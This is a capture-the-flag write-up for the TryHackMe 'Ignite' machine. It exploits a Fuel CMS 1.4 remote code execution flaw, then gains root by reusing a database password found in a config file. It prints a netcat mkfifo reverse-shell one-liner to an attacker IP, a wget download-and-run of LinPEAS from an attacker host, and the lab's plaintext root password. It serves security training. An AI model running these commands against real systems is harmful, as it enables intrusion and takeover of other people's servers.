# 🔥 TryHackMe — Ignite

> **Difficulty:** Easy | **OS:** Linux | **Category:** Web / Privilege Escalation
> **Author:** Aryan Barkhordar

---

## Table of Contents

- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
  * [Port Scanning](#port-scanning)
  * [Web Enumeration](#web-enumeration)
- [Exploitation](#exploitation)
  * [Fuel CMS 1.4 — Remote Code Execution](#fuel-cms-14--remote-code-execution)
  * [Reverse Shell](#reverse-shell)
- [Post-Exploitation](#post-exploitation)
  * [User Flag](#user-flag)
- [Privilege Escalation](#privilege-escalation)
  * [Automated Enumeration — LinPEAS](#automated-enumeration--linpeas)
  * [Database Configuration — Credential Reuse](#database-configuration--credential-reuse)
  * [Root Access via `su`](#root-access-via-su)
- [Flags](#flags)
- [Summary](#summary)

---

## Overview

**Ignite** is a TryHackMe machine built around a known CMS vulnerability. An `nmap` scan exposes HTTP on port 80, identifying the web application as **Fuel CMS version 1.4** — a content management system with a well-documented Remote Code Execution vulnerability. Initial access is gained via a public Python exploit that achieves unauthenticated RCE. Post-exploitation reveals database credentials in a PHP configuration file, which are then reused to escalate directly to root via `su`.

---

## Reconnaissance

### Port Scanning

An initial `nmap` scan identified a single open port:

```
PORT   STATE SERVICE
80/tcp open  http
```

> **Key Finding:** The HTTP service banner exposed the application as **Fuel CMS** — a versioned CMS with publicly known vulnerabilities.

---

### Web Enumeration

Navigating to `http://<TARGET>` confirmed the application was running **Fuel CMS version 1.4**. The landing page displayed the default CMS installation page, including the software name and version.

> **Key Finding:** The version string `Fuel CMS 1.4` was visible on the default page — this is sufficient to identify the applicable CVE without further enumeration.

---

## Exploitation

### Fuel CMS 1.4 — Remote Code Execution

A search for known vulnerabilities in Fuel CMS 1.4 confirmed the presence of an unauthenticated Remote Code Execution vulnerability, exploitable via a crafted request to the `fuel/pages/select/` endpoint.

A public Python exploit was identified and cloned:

```
git clone https://github.com/Errahulaws/fuel-cms-1.4-RCA-exploit
```

The exploit was executed against the target, confirming code execution on the server — arbitrary OS commands could be issued and their output was returned in the HTTP response.

---

### Reverse Shell

With RCE confirmed, a reverse shell payload was injected to obtain an interactive session:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER IP> 4444 >/tmp/f
```

A Netcat listener was established prior to execution:

```
nc -lvnp 4444
```

The payload executed successfully and a reverse shell was received, providing a session on the target as `www-data`.

---

## Post-Exploitation

### User Flag

With an active shell, the filesystem was explored. The user flag was located at:

```
/home/www-data/user.txt
```

```
$ cat /home/www-data/user.txt
THM{REDACTED}
```

---

## Privilege Escalation

### Automated Enumeration — LinPEAS

LinPEAS was transferred to the target and executed:

```
wget http://<ATTACKER>:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

The output highlighted a notable finding within the web application's configuration directory — a PHP file containing plaintext database credentials.

---

### Database Configuration — Credential Reuse

The flagged file was manually inspected:

```
cat /var/www/html/fuel/application/config/database.php
```

The database connection array revealed:

```php
'username' => 'root',
'password' => 'mememe',
```

> **Key Observation:** The database was configured to connect as `root` with a simple plaintext password. This raised the possibility that the system's root account reused the same password.

---

### Root Access via `su`

The discovered credential was tested against the system's root account:

```
su root
Password: mememe
```

Access was granted immediately, elevating the session to full root privileges. The root flag was then retrieved:

```
# cat /root/root.txt
THM{REDACTED}
```

---

## Flags

| Flag        | Value           |
| ----------- | --------------- |
| 🏳️ **User** | `THM{REDACTED}` |
| 🚩 **Root**  | `THM{REDACTED}` |

---

## Summary

| Stage                    | Technique                                                                    |
| ------------------------ | ---------------------------------------------------------------------------- |
| **Recon**                | `nmap` port scan, version fingerprinting via HTTP banner                     |
| **Initial Access**       | Fuel CMS 1.4 RCE — public Python exploit                                     |
| **Shell**                | mkfifo reverse shell → Netcat listener                                       |
| **Enumeration**          | LinPEAS highlights plaintext credentials in `database.php`                   |
| **Privilege Escalation** | Database password reused for root system account → `su root`                 |

---

*Writeup by Aryan Barkhordar*
